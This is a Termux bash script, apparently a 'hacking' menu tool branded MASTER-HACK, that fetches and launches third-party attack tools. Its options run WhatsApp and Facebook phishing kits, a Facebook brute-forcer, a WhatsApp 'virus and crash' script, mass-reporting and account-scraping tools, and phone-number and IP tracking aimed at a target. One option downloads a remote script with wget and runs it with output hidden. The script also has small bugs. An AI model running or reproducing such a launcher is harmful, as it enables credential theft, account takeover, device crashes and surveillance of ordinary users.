#!/bin/bash
clear
apt install pv -y
apt install figlet -y
termux-storage-setup -y
apt install ruby -y
gem install lolcat
clear

figlet HI BRO |pv -qL 50 | lolcat
echo -e " \033[1;31m By "
figlet MASTER-HACK |pv -qL 50 | lolcat
sleep 8
clear
figlet INVADERS ofc | pv -qL 50 | lolcat
sleep 8
clear
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
figlet C-HACKS | pv -qL 39 | lolcat
echo -e " 	\033[1;34mcreated by \033[1;31mMASTER\033[1;35m-\033[1;33mHACK
"
echo -e "
$rset        \033[1;31m select \033[1;36m(type the number)

            $rest \033[1;32m(1) whatsapp-hack

            \033[1;34m(2) fb hack

            \033[1;35m(3) insta hack

            \033[1;36m(4) information gathering


"

      read -p " Enter Your Choice :- " choice

      if [ $choice = 1 ];then
{
clear
	figlet wa-hack |pv -qL 30 | lolcat
      
echo -e "

                \033[1;34m (1)  \033[1;32m wha bot

                \033[1;34m (2)  \033[1;33m wha phishing

                \033[1;34m (3)  \033[1;36mmoded wha

                \033[1;34m (4)  \033[1;31mvirus and crash txt \033[1;34m " |pv -qL 50


              	 read -p   "    enter your option :-" whachoice

                 if [ $whachoice = 1 ];then
sleep 4
termux-open-url https://github.com/DRACULA-HACK/whatsapp-bot-md

               elif [ $whachoice = 2 ];then
cd $home 
git clone https://github.com/Ignitetch/AdvPhishing
cd AdvPhishing/
chmod 777 *
./Android-Setup.sh
./AdvPhishing.sh

               elif [ $whachoice = 3 ];then
termux-open-url https://www.youtube.com/c/TROKSMODS
               elif [ $whachoice = 4 ];then
               apt update

apt upgrade -y

termux-setup-storage -y
cd $home
git clone https://github.com/DRACULA-HACK/Master-virus

cd Master-virus

chmod +x *

./virus.sh

fi

}
elif [ $choice = 2 ];then
{
clear
figlet fb-hack | pv -qL 50 | lolcat

echo " by Master-hack " | lolcat

echo -e " \033[1;36m

        (1)  fb phishing

        (2) fb bruteforce

        (3) fb inf gathering

        (4) fb report

        " | pv -qL 40 | lolcat

read -p "  Enter Your Choice :- " fbtool

if [ $fbtool = 1 ];then
cd $home
git clone https://github.com/htr-tech/zphisher.git

cd zphisher
bash zphisher.sh
elif [ $fbtool = 2 ];then
cd $home
git clone https://github.com/IAmBlackHacker/Facebook-BruteForce
cd Facebook-BruteForce
python3 -m pip install requests bs4
 python3 -m pip install mechanize
python3 fb.py or python fb2.py

elif [ $fbtool = 3 ];then
apt update -y && apt upgrade -y
apt install git -y
apt install python2 -y
git clone https://github.com/xHak9x/fbi.git
cd fbi
pip2 install -r requirements.txt
python2 fbi.py

elif [ $fbtool = 4 ];then


apt install python2 -y

apt install git -y
cd $home
git clone https://github.com/bhikandeshmukh/fbreport.git

cd fbreport

ls

unzip Report.zip

python2 Report.py


fi
}


elif [ $choice = 3 ];then
clear
echo -e  "

\033[1;35m
hi  running the insta hack 
"
sleep 3


echo -e " \033[1;33m INSTALLATION " |pv -qL 40
echo -e


figlet INSTA-FOLLOW-BOTZ |pv -qL 50 | lolcat
apt install figlet -y

apt install toilet -y

apt install cowsay -y

apt install nano -y

apt install ruby -y

gem install lolcat

apt install git curl openssh openssl openssl-tool -y

git clone https://github.com/DRACULA-HACK/insta-follow-botz.git

cd insta-follow-botz

chmod +x insta4.sh

./insta4.sh


elif [ $choice = 4 ];then
clear
figlet INF gathering |pv -qL 50 | lolcat

echo -e "



		(1) ip logger (url filter )

		(2) phone number information gathering (basic)

		(3) fb & insta ( information gathering )

		(4) ip tracker (by master-hack )

		(5) nmap

" |pv -qL 40 | lolcat

	    read -p "  Your Choice :- " inf

if [ $inf = 1 ];then

termux-open-url https://iplogger.org/

elif [ $inf = 2 ];then
cd $home
clear && echo -e '\033[1;32m[*] Download starting... MASTER-HACK' && apt update > /dev/null 2>&1 && apt --assume-yes install wget > /dev/null 2>&1 && wget https://raw.githubusercontent.com/ExpertAnonymous/PhoneInfoga/master/phoneinfoga.sh -q && clear && bash phoneinfoga.sh
cd PhoneInfoga
ls
clear
python2 -m pip install -r requirements.txt
clear
echo -e "		Enter the  target phone number
 

" | pv -qL 40 | lolcat
echo -e " \033[1;34m		Type the country code with +

" | pv -qL 40
read -p " => " code

echo -e "  \033[1;36m number with out country code " | pv -qL 30 

read -p " numb => " number
./phoneinfoga.py -n $code$number

elif [ $inf = 3 ];then

{
echo -e "


		(1) facebook information

		(2) instagram information

" |pv -qL 30 | lolcat

read -p " your option => " social

if [ $social = 2 ];then

figlet INSTA-FOLLOW-BOTZ |pv -qL 50 | lolcat
apt install figlet -y

apt install toilet -y

ip install cowsay -y

apt install nano -y

apt install ruby -y

gem install lolcat

apt install git curl openssh openssl openssl-tool -y

git clone https://github.com/DRACULA-HACK/insta-follow-botz.git

cd insta-follow-botz

chmod +x insta4.sh

./insta4.sh

elif [ $social = 1 ];then

apt install python2 -y
git clone https://github.com/xHak9x/fbi.git
cd fbi
pip2 install -r requirements.txt
python2 fbi.py
fi
}

elif [ $inf = 4 ];then

cd ip/file/Script/

chmod +x Ip.py
./Ip.py

elif [ $inf = 5 ];then
pkg install nmap -y
clear
echo -e "
 
 "
clear
nmap -h

echo -e "

"
 
 echo -e " \033[1;34m type \033[1;31mnmap - options \033[1;34mfor to run the nmap "

fi

fi
